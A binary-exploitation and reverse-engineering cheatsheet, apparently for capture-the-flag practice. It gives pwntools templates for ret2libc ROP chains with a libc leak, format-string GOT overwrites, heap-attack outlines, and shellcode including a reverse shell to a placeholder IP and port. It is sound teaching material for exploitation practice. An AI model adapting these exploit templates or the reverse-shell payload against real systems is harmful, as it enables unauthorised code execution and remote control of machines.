# Binary Exploitation & Reverse Engineering Cheatsheet

## Binary Analysis Workflow

```bash
# 1. Basic file info
file binary
checksec --file=binary   # NX, PIE, RELRO, Stack Canary, FORTIFY

# 2. Strings and symbols
strings binary | grep -iE "flag|password|secret|key|admin|/bin"
nm binary                 # symbols (if not stripped)
readelf -s binary         # ELF symbol table
objdump -d binary         # full disassembly

# 3. Library dependencies
ldd binary
readelf -d binary | grep NEEDED

# 4. Protections summary
# Full RELRO    → GOT is read-only (no GOT overwrite)
# Partial RELRO → GOT writable (GOT overwrite possible)
# NX enabled    → No shellcode on stack (use ROP)
# PIE enabled   → ASLR for binary (need leak)
# Canary        → Stack canary (need leak or bypass)
```

## GDB / GEF / pwndbg

```bash
gdb ./binary

# GEF commands
gef➤  checksec
gef➤  vmmap
gef➤  search-pattern "AAAA"
gef➤  heap bins
gef➤  got
gef➤  canary

# Breakpoints & execution
b *main
b *0x401234
r < input.txt
ni / si / c / fin

# Inspect memory
x/20wx $rsp       # 20 words from stack pointer
x/s 0x402000      # string at address
x/10i $rip        # 10 instructions from IP
info registers

# Finding offsets
pattern create 200
pattern search $rsp
```

## Stack Buffer Overflow

### ROP (NX enabled)
```python
from pwn import *

elf = ELF('./binary')
rop = ROP(elf)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]  # stack alignment

# ret2libc
payload = b"A" * offset
payload += p64(ret)                    # align stack (Ubuntu 18+)
payload += p64(pop_rdi)
payload += p64(next(elf.search(b"/bin/sh\x00")))
payload += p64(elf.symbols['system'])
```

### ret2libc with ASLR (leak required)
```python
from pwn import *

elf = ELF('./binary')
libc = ELF('./libc.so.6')
p = process('./binary')

# Stage 1: leak libc address via puts(GOT)
pop_rdi = 0x401234
payload1 = b"A" * offset
payload1 += p64(pop_rdi)
payload1 += p64(elf.got['puts'])
payload1 += p64(elf.plt['puts'])
payload1 += p64(elf.symbols['main'])  # return to main

p.sendline(payload1)
leaked = u64(p.recvline().strip().ljust(8, b"\x00"))
libc.address = leaked - libc.symbols['puts']
log.success(f"libc base: {hex(libc.address)}")

# Stage 2: ret2system
payload2 = b"A" * offset
payload2 += p64(pop_rdi)
payload2 += p64(next(libc.search(b"/bin/sh\x00")))
payload2 += p64(libc.symbols['system'])

p.sendline(payload2)
p.interactive()
```

## Format String Exploitation

```python
from pwn import *
from pwnlib.fmtstr import FmtStr, fmtstr_payload

# Read from stack: %p, %7$p, %s
# Write with %n: writes number of chars printed so far
# %n → 4 bytes, %hn → 2 bytes, %hhn → 1 byte

def send_payload(payload):
    p.sendline(payload)
    return p.recvline()

fs = FmtStr(execute_fmt=send_payload, offset=OFFSET)
fs.write(target_addr, target_value)
fs.execute_writes()

# Overwrite GOT entry
writes = {elf.got['puts']: libc.symbols['system']}
payload = fmtstr_payload(offset, writes, write_size='short')
```

## Heap Exploitation

### Tcache Poisoning (glibc 2.26-2.33)
```python
# 1. Allocate chunk A, chunk B (same tcache bin)
# 2. Free B, Free A → tcache: A → B
# 3. Allocate (gets A), write target address as fd
# 4. Allocate (gets B), allocate again → target address
# glibc 2.34+: safe-linking — fd = (fd >> 12) ^ target_addr
```

### Use-After-Free (UAF)
```python
# 1. Allocate object A (has function pointer)
# 2. Free A
# 3. Allocate object B same size (gets A's memory)
# 4. Write controlled data to B (overwrite function pointer)
# 5. Call function through A → redirected
```

### House of Force (glibc < 2.29)
```python
# Overwrite top chunk size to 0xffffffffffffffff
# Request: target_addr - top_chunk_addr - header_size
# Next malloc returns chunk at target address
```

## Shellcode

```python
from pwn import *

context.arch = 'amd64'
shellcode = asm(shellcraft.sh())          # /bin/sh
shellcode = asm(shellcraft.connect("IP", PORT) + shellcraft.dupsh())  # reverse shell

# Verify no null bytes
assert b"\x00" not in shellcode
```

## Reverse Engineering

### Ghidra
```
# Import binary → Auto-analyze
# Key: Decompiler, Listing, Symbol Tree
# Tips: Retype variables, rename functions, edit signatures
```

### Dynamic Analysis
```bash
strace ./binary                       # system calls
strace -e trace=network ./binary      # network only
ltrace ./binary                       # library calls

# Symbolic execution (angr)
import angr
proj = angr.Project('./binary', auto_load_libs=False)
state = proj.factory.entry_state()
simgr = proj.factory.simulation_manager(state)
simgr.explore(find=0x401234, avoid=0x401300)
if simgr.found:
    print(simgr.found[0].posix.dumps(0))
```

## Pwntools Quick Reference

```python
from pwn import *

p = process('./binary')              # local
p = remote('target.com', 1337)       # remote
p = gdb.debug('./binary', 'b main')  # with GDB

p.send(b"data")
p.sendline(b"data")
p.sendafter(b"prompt: ", b"data")
p.recv(1024)
p.recvline()
p.recvuntil(b"flag{")
p.interactive()

p64(0xdeadbeef)    # pack 64-bit LE
u64(data.ljust(8, b"\x00"))  # unpack

context.binary = ELF('./binary')
context.log_level = 'debug'

payload = cyclic(200)
offset = cyclic_find(0x61616167)
```
